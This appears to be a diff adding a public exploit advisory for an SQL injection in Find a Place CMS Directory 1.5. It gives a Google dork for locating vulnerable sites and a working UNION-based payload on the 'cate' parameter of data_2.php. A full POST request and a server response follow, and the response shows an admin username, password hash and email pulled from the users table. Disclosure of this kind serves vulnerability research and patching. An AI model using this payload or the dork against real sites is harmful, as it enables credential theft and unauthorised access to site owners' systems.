@@ -1,0 +1,59 @@
+# Exploit Title: Find a Place CMS Directory 1.5 - 'assets/external/data_2.php cate' SQL Injection
+# Google Dork: inurl:"assets/external/data.php"
+# Date: 14 Feb 2019
+# Exploit Author: Deyaa Muhammad
+# Author EMail: contact [at] deyaa.me
+# Author Blog: http://deyaa.me
+# Vendor Homepage: https://themerig.com/
+# Software Link: https://codecanyon.net/item/locations-multipurpose-cms-directory-theme/21098597
+# Demo Website: https://themerig.com/find/
+# Version: 1.5
+# Tested on: WIN7_x68/Linux
+# CVE : N/A
+
+# Description:
+----------------------
+Find a Place CMS Directory 1.5 suffers from a SQL Injection vulnerability.
+
+# POC:
+----------------------
+1. Access the following path https://[PATH]/assets/external/data_2.php
+2. You can perform a "Generic UNION query" and extract admin credentials by sending a "POST" request using the payload below
+cate=2.9') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,concat(username,0x3a3a,password,0x3a3a,email),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users limit 1-- -
+
+# Request:
+----------------------
+POST /find/assets/external/data_2.php HTTP/1.1
+Host: server
+Connection: close
+Content-Length: 251
+Accept: application/json, text/javascript, */*; q=0.01
+Origin: https://themerig.com
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: https://server/find/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+
+cate=2.9') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,concat(username,0x3a3a,password,0x3a3a,email),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM users limit 1-- -
+
+
+# Response:
+----------------------
+HTTP/1.1 200 OK
+X-Powered-By: PHP/5.6.40
+Set-Cookie: PHPSESSID=1sml2ou7o5e379b05l3q0iscq1; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Content-Type: text/html; charset=UTF-8
+Content-Length: 227
+Vary: Accept-Encoding
+Date: Fri, 15 Feb 2019 03:09:26 GMT
+Accept-Ranges: bytes
+Server: LiteSpeed
+Alt-Svc: quic=":443"; ma=2592000; v="35,39,43"
+Connection: close
+
+{"data":[{"id":null,"category":null,"title":null,"address":null,"latitude":null,"longitude":null,"marker_color":null,"feaured":null,"marker_image":[""],"featured":"admin::4db50f86732e926e59d306cff063d568::themerig@server"}]}
